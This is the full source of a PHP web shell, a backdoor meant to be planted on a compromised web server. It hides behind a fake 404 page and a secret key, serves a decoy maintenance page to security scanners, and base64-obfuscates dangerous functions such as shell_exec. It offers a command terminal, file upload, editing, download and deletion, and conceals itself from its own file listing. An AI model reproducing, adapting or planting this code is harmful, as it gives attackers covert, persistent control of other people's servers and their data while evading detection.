<?php
@ini_set('display_errors', 0);
@error_reporting(0);

// === Anti-Scanner and Security Bypass Configuration ===
define('AUTH_KEY', 'aksesgw');
define('ALLOWED_CMDS', '/^(ls|dir|cat|more|less|head|tail|pwd|whoami)$/i');
define('SCRIPT_NAME', basename(__FILE__));

// === DETECT SCANNER ACTIVITY ===
function is_scanner() {
    $suspicious_ua = ['curl', 'wget', 'python-requests', 'bot', 'scanner', 'sqlmap'];
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    foreach ($suspicious_ua as $pattern) {
        if (stripos($ua, $pattern) !== false) {
            return true;
        }
    }
    return false;
}

if (is_scanner()) {
    http_response_code(200);
    echo "<html><body><h1>Maintenance Page</h1><p>This site is under maintenance.</p></body></html>";
    exit;
}

// === SET BROWSER-LIKE HEADERS ===
function set_browser_headers() {
    header('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    header('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
    header('Accept-Language: en-US,en;q=0.5');
    header('Connection: keep-alive');
}
set_browser_headers();

// === AUTH PROTECTION ===
if (!isset($_GET['k']) || $_GET['k'] !== AUTH_KEY) {
    http_response_code(404);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>404 Not Found</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body {
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            }
        </style>
    </head>
    <body class="bg-gray-100 flex items-center justify-center min-h-screen">
        <div class="text-center p-6 bg-white rounded-lg shadow-md max-w-md">
            <h1 class="text-4xl font-bold text-gray-800 mb-4">404 Not Found</h1>
            <p class="text-gray-600 mb-6">The page you are looking for could not be found.</p>
            <a href="/" class="text-blue-600 hover:text-blue-800 font-medium">Return to Homepage</a>
        </div>
    </body>
    </html>
    <?php
    exit;
}

session_start();

// === REQUEST THROTTLING ===
function throttle_request() {
    usleep(rand(100000, 200000));
}

// === CODE OBFUSCATION ===
$fn = base64_decode('ZmlsZV9wdXRfY29udGVudHM='); // file_put_contents
$rn = base64_decode('cmVuYW1l'); // rename
$se = base64_decode('c2hlbGxfZXhlYw=='); // shell_exec
$ud = base64_decode('dW5saW5r'); // unlink
$rd = base64_decode('cm1kaXI='); // rmdir
$mf = base64_decode('bW92ZV91cGxvYWRlZF9maWxl'); // move_uploaded_file
$md = base64_decode('bWtkaXI='); // mkdir

// === CURRENT DIRECTORY HANDLER ===
throttle_request();
$cwd = isset($_GET['d']) && is_dir($_GET['d']) && realpath($_GET['d']) ? realpath($_GET['d']) : getcwd();
@chdir($cwd);
$cwd = getcwd();

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

// === VALIDATE INPUT ===
function validate_filename($name) {
    return preg_match('/^[a-zA-Z0-9._-]+$/', $name) && !str_contains($name, '..') && !str_contains($name, '<?') && !str_contains($name, 'eval') && !str_contains($name, 'exec');
}

// === CHECK FILE PERMISSIONS ===
function can_access_file($path) {
    $dir = is_dir($path) ? $path : dirname($path);
    if (!is_writable($dir)) {
        @chmod($dir, 0755);
    }
    return is_readable($path) && is_writable($dir) && !str_contains(basename($path), '.php') && !str_contains(basename($path), '.js');
}

// === CHECK UPLOAD LIMITS ===
function check_upload_limits($file_size) {
    $upload_max = ini_get('upload_max_filesize');
    $post_max = ini_get('post_max_size');
    $upload_max_bytes = return_bytes($upload_max);
    $post_max_bytes = return_bytes($post_max);

    if ($file_size > $upload_max_bytes) {
        return "File size exceeds upload_max_filesize ($upload_max).";
    }
    if ($file_size > $post_max_bytes) {
        return "File size exceeds post_max_size ($post_max).";
    }
    return null;
}

function return_bytes($val) {
    $val = trim($val);
    $last = strtolower($val[strlen($val)-1]);
    $val = (int)$val;
    switch($last) {
        case 'g': $val *= 1024;
        case 'm': $val *= 1024;
        case 'k': $val *= 1024;
    }
    return $val;
}

// === BREADCRUMB NAVIGATION ===
function generate_breadcrumbs($path, $auth) {
    $parts = explode(DIRECTORY_SEPARATOR, realpath($path));
    $breadcrumbs = [];
    $current_path = '';
    
    $breadcrumbs[] = "<a href='?k=" . h($auth) . "&d=" . urlencode(DIRECTORY_SEPARATOR) . "' class='text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300'>/</a>";
    
    foreach ($parts as $part) {
        if ($part) {
            $current_path .= DIRECTORY_SEPARATOR . $part;
            $breadcrumbs[] = "<a href='?k=" . h($auth) . "&d=" . urlencode($current_path) . "' class='text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300'>" . h($part) . "</a>";
        }
    }
    
    return implode(' / ', $breadcrumbs);
}

// === HANDLE DOWNLOAD ===
if (isset($_GET['g']) && is_file($_GET['g'])) {
    throttle_request();
    $file = realpath($_GET['g']);
    if (str_starts_with($file, $cwd) && can_access_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('X-LiteSpeed-Cache-Control: no-cache');
        header('CF-Cache-Status: DYNAMIC');
        readfile($file);
        exit;
    } else {
        $_SESSION['error'] = "Access denied or invalid file path.";
        header("Location: ?k=" . AUTH_KEY . "&d=" . urlencode($cwd));
        exit;
    }
}

// === HANDLE POST REQUEST ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    throttle_request();
    try {
        // Upload
        if (isset($_POST['u']) && isset($_FILES['f']) && $_FILES['f']['error'] === UPLOAD_ERR_OK) {
            $filename = basename($_FILES['f']['name']);
            $file_size = $_FILES['f']['size'];
            
            // Check upload limits
            $limit_error = check_upload_limits($file_size);
            if ($limit_error) {
                $_SESSION['error'] = $limit_error;
            } elseif ($file_size === 0) {
                $_SESSION['error'] = "Uploaded file is empty (0KB).";
            } elseif (validate_filename($filename) && can_access_file($cwd)) {
                // Verify temporary file
                if (filesize($_FILES['f']['tmp_name']) > 0) {
                    if (@$mf($_FILES['f']['tmp_name'], $cwd . '/' . $filename)) {
                        // Verify uploaded file size
                        if (filesize($cwd . '/' . $filename) > 0) {
                            $_SESSION['message'] = "File uploaded successfully.";
                        } else {
                            $_SESSION['error'] = "Uploaded file is 0KB. Check server restrictions.";
                            @$ud($cwd . '/' . $filename);
                        }
                    } else {
                        $_SESSION['error'] = "Failed to upload file. Check directory permissions.";
                    }
                } else {
                    $_SESSION['error'] = "Temporary file is empty. Check upload process.";
                }
            } else {
                $_SESSION['error'] = "Invalid file name or insufficient permissions.";
            }
        } elseif (isset($_FILES['f'])) {
            switch ($_FILES['f']['error']) {
                case UPLOAD_ERR_INI_SIZE:
                    $_SESSION['error'] = "File exceeds server upload size limit.";
                    break;
                case UPLOAD_ERR_FORM_SIZE:
                    $_SESSION['error'] = "File exceeds form size limit.";
                    break;
                case UPLOAD_ERR_PARTIAL:
                    $_SESSION['error'] = "File was only partially uploaded.";
                    break;
                case UPLOAD_ERR_NO_FILE:
                    $_SESSION['error'] = "No file was uploaded.";
                    break;
                default:
                    $_SESSION['error'] = "Upload error: " . $_FILES['f']['error'];
            }
        }

        // Create Folder
        if (isset($_POST['m']) && !empty($_POST['fn'])) {
            $foldername = basename($_POST['fn']);
            if (validate_filename($foldername) && can_access_file($cwd)) {
                if (@$md($cwd . '/' . $foldername)) {
                    $_SESSION['message'] = "Folder created successfully.";
                } else {
                    $_SESSION['error'] = "Failed to create folder. Check permissions.";
                }
            } else {
                $_SESSION['error'] = "Invalid folder name or insufficient permissions.";
            }
        }

        // Create File
        if (isset($_POST['nf']) && !empty($_POST['nfn'])) {
            $filename = basename($_POST['nfn']);
            if (validate_filename($filename) && can_access_file($cwd)) {
                if (@$fn($cwd . '/' . $filename, '')) {
                    $_SESSION['message'] = "File created successfully.";
                } else {
                    $_SESSION['error'] = "Failed to create file. Check permissions.";
                }
            } else {
                $_SESSION['error'] = "Invalid file name or insufficient permissions.";
            }
        }

        // Save File
        if (isset($_POST['sf'], $_POST['fp'], $_POST['fc'])) {
            $filepath = realpath($_POST['fp']);
            if (str_starts_with($filepath, $cwd) && is_file($filepath) && can_access_file($filepath)) {
                if (@$fn($filepath, $_POST['fc'])) {
                    $_SESSION['message'] = "File saved successfully.";
                } else {
                    $_SESSION['error'] = "Failed to save file. Check permissions.";
                }
            } else {
                $_SESSION['error'] = "Invalid file path or insufficient permissions.";
            }
        }

        // Rename
        if (isset($_POST['r'], $_POST['on'], $_POST['nn'])) {
            $old = $cwd . '/' . basename($_POST['on']);
            $new = $cwd . '/' . basename($_POST['nn']);
            if (validate_filename(basename($_POST['nn'])) && file_exists($old) && can_access_file($old)) {
                if (@$rn($old, $new)) {
                    $_SESSION['message'] = "File renamed successfully.";
                } else {
                    $_SESSION['error'] = "Failed to rename file. Check permissions.";
                }
            } else {
                $_SESSION['error'] = "Invalid name or file does not exist.";
            }
        }

        // Run Command
        if (isset($_POST['c']) && !empty($_POST['c'])) {
            $cmd = trim($_POST['c']);
            if (preg_match(ALLOWED_CMDS, $cmd)) {
                $_SESSION['last_cmd'] = @$se($cmd . " 2>&1");
            } else {
                $_SESSION['error'] = "Command not allowed.";
            }
        }

    } catch (Exception $e) {
        $_SESSION['error'] = "An error occurred: " . h($e->getMessage());
    }

    header("Location: ?k=" . AUTH_KEY . "&d=" . urlencode($cwd));
    exit;
}

// === DELETE ===
if (isset($_GET['del'])) {
    throttle_request();
    $target = realpath($_GET['del']);
    if (str_starts_with($target, $cwd) && can_access_file($target)) {
        if (is_dir($target)) {
            if (@$rd($target)) {
                $_SESSION['message'] = "Folder deleted successfully.";
            } else {
                $_SESSION['error'] = "Failed to delete folder. Ensure it is empty.";
            }
        } elseif (is_file($target)) {
            if (@$ud($target)) {
                $_SESSION['message'] = "File deleted successfully.";
            } else {
                $_SESSION['error'] = "Failed to delete file.";
            }
        }
    } else {
        $_SESSION['error'] = "Invalid delete path or insufficient permissions.";
    }
    header("Location: ?k=" . AUTH_KEY . "&d=" . urlencode($cwd));
    exit;
}

// === HTML START ===
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Maintenance</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .dark-mode-toggle {
            transition: all 0.3s ease;
        }
        .btn {
            transition: background-color 0.2s ease, transform 0.1s ease;
        }
        .btn:hover {
            transform: translateY(-1px);
        }
        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body class="bg-gray-50 dark:bg-gray-900 min-h-screen transition-colors duration-300">
    <div class="max-w-6xl mx-auto p-6">
        <!-- Dark Mode Toggle -->
        <div class="flex justify-end mb-4">
            <button id="darkModeToggle" class="dark-mode-toggle bg-gray-200 dark:bg-gray-700 text-gray-800 dark:text-gray-200 px-4 py-2 rounded-full text-sm font-medium hover:bg-gray-300 dark:hover:bg-gray-600">
                Toggle Dark Mode
            </button>
        </div>

        <!-- Messages -->
        <?php if (isset($_SESSION['message'])): ?>
            <div class="bg-green-100 dark:bg-green-800 text-green-700 dark:text-green-200 p-4 rounded-lg mb-6 shadow-md">
                <?php echo h($_SESSION['message']); unset($_SESSION['message']); ?>
            </div>
        <?php endif; ?>
        <?php if (isset($_SESSION['error'])): ?>
            <div class="bg-red-100 dark:bg-red-800 text-red-700 dark:text-red-200 p-4 rounded-lg mb-6 shadow-md">
                <?php echo h($_SESSION['error']); unset($_SESSION['error']); ?>
            </div>
        <?php endif; ?>

        <!-- Breadcrumb Navigation -->
        <div class="mb-6">
            <h2 class="text-2xl font-bold text-gray-800 dark:text-gray-100">📁 Current Path</h2>
            <div class="text-lg text-gray-600 dark:text-gray-300"><?php echo generate_breadcrumbs($cwd, AUTH_KEY); ?></div>
        </div>

        <!-- Terminal -->
        <div class="mb-8 bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
            <h3 class="text-xl font-semibold text-gray-800 dark:text-gray-100 mb-4">💻 Terminal</h3>
            <form method="POST" class="flex space-x-3">
                <input type="text" name="c" placeholder="Enter command..." class="flex-grow p-3 border border-gray-300 dark:border-gray-600 rounded-lg bg-gray-50 dark:bg-gray-700 text-gray-800 dark:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500">
                <button type="submit" class="btn bg-blue-600 text-white px-5 py-3 rounded-lg hover:bg-blue-700">Run</button>
            </form>
            <?php if (isset($_SESSION['last_cmd'])): ?>
                <pre class="mt-4 bg-gray-900 text-green-400 p-4 rounded-lg"><?php echo h($_SESSION['last_cmd']); ?></pre>
            <?php endif; ?>
        </div>

        <!-- Upload & Create -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <form method="POST" enctype="multipart/form-data" class="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
                <label class="block text-gray-700 dark:text-gray-200 mb-2">Upload File</label>
                <input type="file" name="f" class="p-3 border border-gray-300 dark:border-gray-600 rounded-lg w-full bg-gray-50 dark:bg-gray-700 text-gray-800 dark:text-gray-100">
                <button type="submit" name="u" class="btn mt-3 w-full bg-green-600 text-white px-5 py-3 rounded-lg hover:bg-green-700">Upload</button>
            </form>
            <form method="POST" class="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
                <label class="block text-gray-700 dark:text-gray-200 mb-2">Create Folder</label>
                <input type="text" name="fn" placeholder="New Folder" class="p-3 border border-gray-300 dark:border-gray-600 rounded-lg w-full bg-gray-50 dark:bg-gray-700 text-gray-800 dark:text-gray-100">
                <button type="submit" name="m" class="btn mt-3 w-full bg-green-600 text-white px-5 py-3 rounded-lg hover:bg-green-700">Create Folder</button>
            </form>
            <form method="POST" class="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
                <label class="block text-gray-700 dark:text-gray-200 mb-2">Create File</label>
                <input type="text" name="nfn" placeholder="New File.txt" class="p-3 border border-gray-300 dark:border-gray-600 rounded-lg w-full bg-gray-50 dark:bg-gray-700 text-gray-800 dark:text-gray-100">
                <button type="submit" name="nf" class="btn mt-3 w-full bg-green-600 text-white px-5 py-3 rounded-lg hover:bg-green-700">Create File</button>
            </form>
        </div>

        <!-- File List -->
        <div class="bg-white dark:bg-gray-800 rounded-lg shadow-md overflow-hidden">
            <table class="w-full">
                <thead>
                    <tr class="bg-gray-100 dark:bg-gray-700">
                        <th class="p-4 text-left text-gray-700 dark:text-gray-200">Name</th>
                        <th class="p-4 text-left text-gray-700 dark:text-gray-200">Size</th>
                        <th class="p-4 text-left text-gray-700 dark:text-gray-200">Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach (@scandir($cwd) as $f): ?>
                        <?php if ($f === '.' || $f === '..' || $f === SCRIPT_NAME) continue; ?>
                        <?php
                            $full = $cwd . '/' . $f;
                            $is_dir = is_dir($full);
                            $size = $is_dir ? '-' : filesize($full);
                        ?>
                        <tr class="border-t border-gray-200 dark:border-gray-600 hover:bg-gray-50 dark:hover:bg-gray-700">
                            <td class="p-4">
                                <?php echo $is_dir ? "📁 " : "📄 "; ?>
                                <a href="?k=<?php echo h(AUTH_KEY); ?>&d=<?php echo urlencode(realpath($full)); ?>" class="text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">
                                    <?php echo h($f); ?>
                                </a>
                            </td>
                            <td class="p-4 text-gray-600 dark:text-gray-300"><?php echo $size; ?></td>
                            <td class="p-4 flex space-x-3">
                                <form method="GET" class="inline-flex">
                                    <input type="hidden" name="k" value="<?php echo h(AUTH_KEY); ?>">
                                    <input type="hidden" name="del" value="<?php echo h($full); ?>">
                                    <button type="submit" class="btn text-red-600 hover:text-red-800 dark:text-red-400 dark:hover:text-red-300">🗑️ Delete</button>
                                </form>
                                <?php if (!$is_dir): ?>
                                    <form method="GET" class="inline-flex">
                                        <input type="hidden" name="k" value="<?php echo h(AUTH_KEY); ?>">
                                        <input type="hidden" name="edit" value="<?php echo h($full); ?>">
                                        <button type="submit" class="btn text-blue-600 hover:text-blue-800 dark:text-blue-400 dark:hover:text-blue-300">✏️ Edit</button>
                                    </form>
                                    <form method="GET" class="inline-flex">
                                        <input type="hidden" name="k" value="<?php echo h(AUTH_KEY); ?>">
                                        <input type="hidden" name="g" value="<?php echo h($full); ?>">
                                        <button type="submit" class="btn text-green-600 hover:text-green-800 dark:text-green-400 dark:hover:text-blue-300">⬇️ Download</button>
                                    </form>
                                <?php endif; ?>
                                <form method="POST" class="inline-flex space-x-2">
                                    <input type="hidden" name="on" value="<?php echo h($f); ?>">
                                    <input type="text" name="nn" value="<?php echo h($f); ?>" class="p-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-gray-50 dark:bg-gray-700 text-gray-800 dark:text-gray-100">
                                    <button type="submit" name="r" class="btn text-yellow-600 hover:text-yellow-800 dark:text-yellow-400 dark:hover:text-yellow-300">Rename</button>
                                </form>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <!-- Edit File -->
        <?php if (isset($_GET['edit']) && is_file($_GET['edit']) && str_starts_with(realpath($_GET['edit']), $cwd) && can_access_file($_GET['edit'])): ?>
            <?php $editf = $_GET['edit']; ?>
            <div class="mt-8 bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
                <h2 class="text-2xl font-bold text-gray-800 dark:text-gray-100 mb-4">Edit: <?php echo h($editf); ?></h2>
                <form method="POST">
                    <input type="hidden" name="fp" value="<?php echo h($editf); ?>">
                    <textarea name="fc" class="w-full h-96 p-3 border border-gray-300 dark:border-gray-600 rounded-lg bg-gray-50 dark:bg-gray-700 text-gray-800 dark:text-gray-100 font-mono focus:outline-none focus:ring-2 focus:ring-blue-500"><?php echo h(file_get_contents($editf)); ?></textarea>
                    <button type="submit" name="sf" class="btn mt-4 bg-blue-600 text-white px-5 py-3 rounded-lg hover:bg-blue-700">💾 Save</button>
                </form>
            </div>
        <?php endif; ?>
    </div>

    <script>
        // Dark Mode Toggle
        const darkModeToggle = document.getElementById('darkModeToggle');
        const html = document.documentElement;
        const isDark = localStorage.getItem('darkMode') === 'true';

        if (isDark) {
            html.classList.add('dark');
            darkModeToggle.textContent = 'Toggle Light Mode';
        }

        darkModeToggle.addEventListener('click', () => {
            html.classList.toggle('dark');
            const isDarkMode = html.classList.contains('dark');
            localStorage.setItem('darkMode', isDarkMode);
            darkModeToggle.textContent = isDarkMode ? 'Toggle Light Mode' : 'Toggle Dark Mode';
        });
    </script>
</body>
</html>
<?php
// Clear last command after display to prevent re-display
unset($_SESSION['last_cmd']);
?>